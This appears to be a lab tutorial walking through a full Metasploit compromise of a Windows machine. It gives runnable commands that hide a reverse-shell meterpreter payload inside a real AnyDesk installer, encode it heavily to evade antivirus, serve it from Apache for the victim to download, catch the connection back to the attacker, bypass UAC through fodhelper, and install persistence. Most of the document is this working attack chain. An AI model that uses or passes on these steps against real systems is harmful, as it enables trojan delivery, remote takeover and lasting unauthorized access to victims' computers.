Instructions to Run Metasploit Exploitation
1.Environment Setup

    Attacker Machine: Kali Linux (with Metasploit installed)

    Target Machine: Windows (firewall & antivirus disabled for testing)

    Ensure both machines are on the same network/subnet.

    Note down the Kali IP address using:

    ip addr show

2.Generate a Payload with msfvenom

On Kali, run:

msfvenom -p windows/meterpreter/reverse_tcp \
lhost=<Kali_IP> lport=6666 \
-x /home/kali/Downloads/AnyDesk.exe -k \
-e x86/shikata_ga_nai -i 100 -f exe \
-o /var/www/html/AnyDesk.exe

Explanation:

    -p: Payload type

    lhost: Attacker IP

    lport: Listening port

    -x: Use an existing EXE as a template

    -k: Keep original executable functionality

    -e: Encoder

    -i: Encoding iterations

    -f exe: Output as Windows executable

    -o: Output file path

3.Host the Payload via Apache

Start Apache web server:

sudo systemctl start apache2

The payload will be available at:

http://<Kali_IP>/AnyDesk.exe

4.Deliver the Payload

On the Windows target:

    Open a browser.

    Visit http://<Kali_IP>/AnyDesk.exe.

    Download and run the file.

5.Start Metasploit Listener

On Kali:

msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <Kali_IP>
set lport 6666
exploit

    Wait for the target to execute the file.

    Meterpreter session should open.

6.Privilege Escalation

Inside Metasploit:

use exploit/windows/local/bypassuac_fodhelper
set payload windows/meterpreter/reverse_tcp
set lhost <Kali_IP>
set lport 6666
set session 1
run

7.Persistence

Inside Metasploit:

use exploit/windows/local/persistence
set payload windows/meterpreter/reverse_tcp
set lhost <Kali_IP>
set lport 6666
set session 2
run



8.Automating with Resource File

Create test.rc file:

use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set lhost <Kali_IP>
set lport 6666
exploit

Run with:

msfconsole -r test.rc

